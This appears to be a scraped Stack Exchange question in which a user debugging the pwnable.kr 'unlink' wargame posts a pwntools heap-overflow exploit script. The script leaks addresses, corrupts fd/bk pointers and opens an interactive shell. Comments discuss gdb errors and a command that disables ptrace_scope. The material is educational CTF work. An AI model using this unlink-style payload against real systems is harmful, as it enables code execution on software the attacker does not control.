@@ -1,0 +1,41 @@
+{
+    "title": "can't debug properly",
+    "link": "https://reverseengineering.stackexchange.com/questions/30923/cant-debug-properly",
+    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  In the last few days I tried to solve \"unlink\" challenge in pwnable.kr and I'm struggling to attach a debugger remotely and locally on the server using pwntools (code added below).\n </p>\n <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom pwn import *\n\nexe = context.binary = ELF('unlink_local')\n\nhost = args.HOST or 'pwnable.kr'\nport = int(args.PORT or 2222)\nuser = args.USER or 'unlink'\npassword = args.PASSWORD or 'guest'\nremote_path = '/home/unlink/unlink'\n\n# Connect to the remote SSH server\nshell = None\nif not args.LOCAL:\n    shell = ssh(user, host, port, password)\n    shell.set_working_directory(symlink=True)\n\ndef start_local(argv=[], *a, **kw):\n    '''Execute the target binary locally'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\ndef start_remote(argv=[], *a, **kw):\n    '''Execute the target binary on the remote host'''\n    if args.GDB:\n        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)\n    else:\n        return shell.process([remote_path] + argv, *a, **kw)\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.LOCAL:\n        return start_local(argv, *a, **kw)\n    else:\n        return start_remote(argv, *a, **kw)\n\ngdbscript = '''\ntbreak main\ncontinue\n'''.format(**locals())\n\nr = start()\n\nstack_leak = r.recvline(keepends=False)\nstack_leak = int(stack_leak.decode(\"latin-1\").split(\": \")[1], 16)\nheap_leak = r.recvline(keepends=False)\nheap_leak = int(heap_leak.decode(\"latin-1\").split(\": \")[1], 16)\nret_addr_on_stack = stack_leak + 0x28  # 0x28 is the offset between the leak and the return address location on\n# the stack (checked in gdb via running the program multiple times and checking the offset)\nshellcode_location_on_heap = heap_leak + 0x50\n\n\"\"\"\nPayload layout (in this exact order)\n\"\"\"\nA_buf = b\"A\" * 8  # A's buf variable (in the struct 'tagOBJ' in the source) overflow\n\nB_prev_size = b\"B\" * 4  # B's prev_size variable (in malloc internals) overflow\nB_size = b\"C\" * 4  # B's size variable (in malloc internals) overflow\nB_fd = p32(ret_addr_on_stack - 0x4)  # B's fd pointer (in the struct 'tagOBJ') overflow   \nB_bk = p32(shellcode_location_on_heap)  # 0x080484eb  # B's bk pointer (in the struct 'tagOBJ') overflow      ----- shell() function address\nB_buf = b\"D\" * 8  # B's buf variable (in the struct 'tagOBJ') overflow\n\nC_prev_size = b\"E\" * 4  # B's prev_size variable (in malloc internals) overflow\nC_size = b\"F\" * 4  # B's size variable (in malloc internals) overflow\nC_fd = b\"PPPP\"  # C's fd pointer (in the struct 'tagOBJ') overflow      ----- empty (doesn't point anywhere)\nC_bk = b\"LLLL\"  # C's bk pointer (in the struct 'tagOBJ') overflow      ----- RET ADDRESS LOCATION ON STACK\n\npayload = A_buf + B_prev_size + B_size + B_fd + B_bk + B_buf + C_prev_size + C_size + C_fd + C_bk\nwith open(\"inp\", \"wb\") as f:\n    f.write(payload)\n\nr.sendlineafter(b'now that you have leaks, get shell!\n', payload)\nr.interactive()\n</code></pre>\n <p>\n  When i attach gdb\n  <strong>\n   remotely\n  </strong>\n  using pwntools, I get the following error message from the server:\n </p>\n <pre><code>[DEBUG] Received 0x8f bytes:\n    '/build/gdb-9un5Xp/gdb-7.11.1/gdb/gdbserver/regcache.c:264:\n'\n    'A problem internal to GDBserver has been detected.\n'\n    'Unknown register ymm0h requested\n'\n</code></pre>\n <p>\n  In addition, when I attach gdb\n  <strong>\n   locally on the server\n  </strong>\n  using pwntools with tmux (because without tmux it can't find a terminal to open gdb in, I don't know why), I get this error:\n </p>\n <pre><code>Attaching to program: /home/unlink/unlink, process 50201\nCould not attach to process.  If your uid matches the uid of the target\nprocess, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try\nagain as the root user.  For more details, see /etc/sysctl.d/10-ptrace.conf\nptrace: Operation not permitted.\n/tmp/tal/50201: No such file or directory.\nBreakpoint 1 at 0x804851e\n(gdb)\n</code></pre>\n <p>\n  The same error happens when attaching to the process by its pid without pwntools (via gdb -p {pid}).\n </p>\n <p>\n  I will point out that I've tried to run the program on my pc (not on their server), and the heap layout was different (I think malloc aligned to 16 bytes instead of 4? not sure why its different to be honest), so running locally will not work.\n </p>\n <p>\n  Please note that I realise that this exploit doesn't work correctly, and my problem is that I don't know how to debug it properly, so please avoid giving corrections to the exploit itself.\n </p>\n <p>\n  Hints will be appreciated :)\n </p>\n</div>\n</body></html>",
+    "votes": "2",
+    "answers": 0,
+    "views": "318",
+    "tags": [
+        "gdb"
+    ],
+    "user": "talsim",
+    "time": "Sep 26, 2022 at 14:37",
+    "comments": [
+        {
+            "user": "Mega Tonnage",
+            "text": "<html><body><span class=\"comment-copy\">\n The\n <code>\n  Unknown register ymm0h requested\n </code>\n issue may be resolved by upgrading to gdb 8.1 or later.\n</span>\n</body></html>",
+            "time": null
+        },
+        {
+            "user": "talsim",
+            "text": "<html><body><span class=\"comment-copy\">\n I'm unable to upgrade gdb because I don't have sudo on their server\n</span>\n</body></html>",
+            "time": null
+        },
+        {
+            "user": "Mega Tonnage",
+            "text": "<html><body><span class=\"comment-copy\">\n Ok.. the reason you need tmux is because you have no TTY allocated to your ssh connection, I'm not sure if pwntools supports passing options to ssh.  Regarding the 'operation not permitted' message, you'll need to confirm that the target process and you have the same UID.\n</span>\n</body></html>",
+            "time": null
+        },
+        {
+            "user": "talsim",
+            "text": "<html><body><span class=\"comment-copy\">\n So how can I solve this man? I'm out of ideas haha\n</span>\n</body></html>",
+            "time": null
+        },
+        {
+            "user": "Mega Tonnage",
+            "text": "<html><body><span class=\"comment-copy\">\n Ignoring the unlink challenge for a bit... start a process (pdf reader, something long lived), obtain the pid, then try to attach to it with gdb. If you can't, then run\n <code>\n  sysctl kernel.yama.ptrace_scope\n </code>\n . If it isn't zero then set it to zero with\n <code>\n  sudo sysctl -w kernel.yama.ptrace_scope=0\n </code>\n and try attaching again.\n</span>\n</body></html>",
+            "time": null
+        }
+    ],
+    "answers_data": []
+}
